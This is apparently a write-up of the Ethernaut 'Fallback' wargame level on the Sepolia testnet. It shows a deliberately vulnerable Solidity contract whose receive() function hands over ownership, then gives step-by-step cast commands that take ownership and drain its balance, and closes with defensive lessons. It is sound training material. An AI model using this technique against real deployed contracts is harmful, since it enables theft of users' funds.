# 01 - Fallback

## Overview

- **Difficulty:** 1/10
- **Network:** Sepolia Testnet
- **Instance Address:** [`0xAcF384d2700663050622313970Ef853e99A43979`](https://sepolia.etherscan.io/address/0xAcF384d2700663050622313970Ef853e99A43979)
- **Transactions:**
  - **1. Contribute (`contribute`):** [`0xb546b46ce75d62907275d7d8bbb3be4b5db7b22b4add41ccb9cde170c0e3aafc`](https://sepolia.etherscan.io/tx/0xb546b46ce75d62907275d7d8bbb3be4b5db7b22b4add41ccb9cde170c0e3aafc)
  - **2. Claim Ownership (`receive`):** [`0x678f62576114be23cea4a1eca69cd24b8799181108b22f813a4542c37f7ea795`](https://sepolia.etherscan.io/tx/0x678f62576114be23cea4a1eca69cd24b8799181108b22f813a4542c37f7ea795)
  - **3. Drain Contract (`withdraw`):** [`0x50f91584347a00551a914b22a5d925db03d594ba0c6dd59c710c7bd86793e9f6`](https://sepolia.etherscan.io/tx/0x50f91584347a00551a914b22a5d925db03d594ba0c6dd59c710c7bd86793e9f6)
  - **4. Level Submission:** [`0xf425febbc049817be1c7ac5ec53ea004f8ac87407611f0ff50643eeb0c169650`](https://sepolia.etherscan.io/tx/0xf425febbc049817be1c7ac5ec53ea004f8ac87407611f0ff50643eeb0c169650)

---

## Objectives

1. Claim ownership of the contract.
2. Drain the contract balance to 0.

---

## Contract Analysis

The target contract is [`src/01-fallback/Fallback.sol`](./Fallback.sol):

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {
    mapping(address => uint256) public contributions;
    address public owner;

    constructor() {
        owner = msg.sender;
        contributions[msg.sender] = 1000 * (1 ether);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function contribute() public payable {
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;
        if (contributions[msg.sender] > contributions[owner]) {
            owner = msg.sender;
        }
    }

    function getContribution() public view returns (uint256) {
        return contributions[msg.sender];
    }

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
    }
}
```

### Vulnerability Breakdown

There are two ways `owner` can be modified in this contract:

1. **Via `contribute()`:**
   ```solidity
   require(msg.value < 0.001 ether);
   contributions[msg.sender] += msg.value;
   if (contributions[msg.sender] > contributions[owner]) {
       owner = msg.sender;
   }
   ```
   The contract deployer (the original owner) starts with a contribution of `1000 ether`. Since each contribution is capped at `< 0.001 ether`, taking over ownership through `contribute()` would require more than `1,000,000` separate transactions. This is intentionally impractical.

2. **Via `receive()`:**
   ```solidity
   receive() external payable {
       require(msg.value > 0 && contributions[msg.sender] > 0);
       owner = msg.sender;
   }
   ```
   Solidity's special `receive()` function executes automatically whenever the contract receives plain Ether with empty calldata.
   
   Notice the condition:
   - `msg.value > 0`
   - `contributions[msg.sender] > 0`

   If we contribute even `1 wei` via `contribute()`, our `contributions[msg.sender]` becomes non-zero. Afterwards, sending any plain ETH transfer directly to the contract triggers `receive()`, which immediately reassigns `owner = msg.sender`!

Once we are the `owner`, we can call the `onlyOwner` function `withdraw()` to drain all Ether from the contract.

---

## Step-by-Step Exploit Walkthrough

### Step 1: Make a Valid Contribution
Call `contribute()` with an amount less than `0.001 ether` (e.g., `1 wei`). This satisfies the requirement that `contributions[msg.sender] > 0`.

**Via Cast:**
```bash
cast send 0xAcF384d2700663050622313970Ef853e99A43979 "contribute()" \
  --value 1wei \
  --rpc-url $SEPOLIA_RPC_URL \
  --account <YOUR_ACCOUNT>
```
- **Tx Hash:** [`0xb546b46ce75d62907275d7d8bbb3be4b5db7b22b4add41ccb9cde170c0e3aafc`](https://sepolia.etherscan.io/tx/0xb546b46ce75d62907275d7d8bbb3be4b5db7b22b4add41ccb9cde170c0e3aafc)

---

### Step 2: Trigger `receive()` to Claim Ownership
Send a plain ETH transaction (with empty calldata and non-zero value, e.g., `1 wei`) directly to the contract address.

**Via Cast:**
```bash
cast send 0xAcF384d2700663050622313970Ef853e99A43979 \
  --value 1wei \
  --rpc-url $SEPOLIA_RPC_URL \
  --account <YOUR_ACCOUNT>
```
- **Tx Hash:** [`0x678f62576114be23cea4a1eca69cd24b8799181108b22f813a4542c37f7ea795`](https://sepolia.etherscan.io/tx/0x678f62576114be23cea4a1eca69cd24b8799181108b22f813a4542c37f7ea795)

Verify that ownership has transferred to your address:
```bash
cast call 0xAcF384d2700663050622313970Ef853e99A43979 "owner()(address)" --rpc-url $SEPOLIA_RPC_URL
```

---

### Step 3: Drain Contract Balance
Now that we are the owner, call `withdraw()` to sweep the entire contract balance to our address.

**Via Cast:**
```bash
cast send 0xAcF384d2700663050622313970Ef853e99A43979 "withdraw()" \
  --rpc-url $SEPOLIA_RPC_URL \
  --account <YOUR_ACCOUNT>
```
- **Tx Hash:** [`0x50f91584347a00551a914b22a5d925db03d594ba0c6dd59c710c7bd86793e9f6`](https://sepolia.etherscan.io/tx/0x50f91584347a00551a914b22a5d925db03d594ba0c6dd59c710c7bd86793e9f6)

Check that the contract balance is `0`:
```bash
cast balance 0xAcF384d2700663050622313970Ef853e99A43979 --rpc-url $SEPOLIA_RPC_URL
# Output: 0
```

Both objectives are fulfilled! Finally, click **"Submit instance"** in the Ethernaut UI to claim level completion.
- **Submission Tx:** [`0xf425febbc049817be1c7ac5ec53ea004f8ac87407611f0ff50643eeb0c169650`](https://sepolia.etherscan.io/tx/0xf425febbc049817be1c7ac5ec53ea004f8ac87407611f0ff50643eeb0c169650)

---

## Key Security Takeaways

1. **Dangers of Critical Logic in Fallback / Receive Functions:**
   - Fallback functions (`receive()` and `fallback()`) should be strictly minimal and used solely for accepting payments or logging events.
   - Never place sensitive state transitions (such as transferring ownership or resetting access controls) inside fallback or receive handlers.
2. **Access Control Integrity:**
   - Administrative roles like `owner` should only be updated through dedicated, highly secured admin functions (e.g., using two-step transfer patterns like OpenZeppelin's `Ownable2Step`).
3. **Difference between `receive()` and `fallback()` in Solidity:**
   - `receive() external payable`: Triggered when ETH is sent to the contract with empty calldata (`msg.data.length == 0`).
   - `fallback() external [payable]`: Triggered when no other function matches the calldata identifier, or when ETH is sent but no `receive()` function exists.
